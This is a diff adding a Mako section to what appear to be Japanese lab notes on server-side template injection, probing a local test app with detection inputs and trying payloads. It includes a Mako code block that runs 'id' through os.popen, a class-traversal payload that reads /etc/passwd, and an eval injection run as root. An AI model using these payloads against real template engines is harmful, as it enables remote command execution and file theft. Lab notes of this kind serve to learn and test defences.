@@ -417,6 +417,40 @@ http://192.168.99.100:15001/reflect/eval?inj=__import__(%27os%27).popen(%27id%27
 cezfkidwuid=0(root) gid=0(root) groups=0(root) govhugaq
 ```
 #### mako
+```python
+    if engine == 'mako':
+        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
+```
+以下より、Makoだと判定できる。   
+```txt
+http://192.168.99.100:15001/reflect/mako?inj=*
+dfgmhedp*gtvdwfrn
+
+http://192.168.99.100:15001/reflect/mako?inj=${7*7}
+ezzrutbb49gjbioohx
+
+http://192.168.99.100:15001/reflect/mako?inj=aaa{*comment*}bbb
+zhkcggiiaaa{*comment*}bbbagrgkbii
+
+http://192.168.99.100:15001/reflect/mako?inj=${%22*%22.join(%22___%22)}
+nyagqhvz_*_*_cahscroa
+```
+RCEするには以下があるらしいが、これ無理では？   
+```python
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+以下とかで`${engine}`で`engine`変数の値が読めるかと思ったけどだめっぽい？   
+```txt
+http://192.168.99.100:15001/reflect/mako?inj={{%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
+pueqjbpv{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}zqhejroz
+
+http://192.168.99.100:15001/reflect/mako?inj=${engine}
+Internal Server Error
+```
 #### jinja2
 #### tornado
 ### Ruby
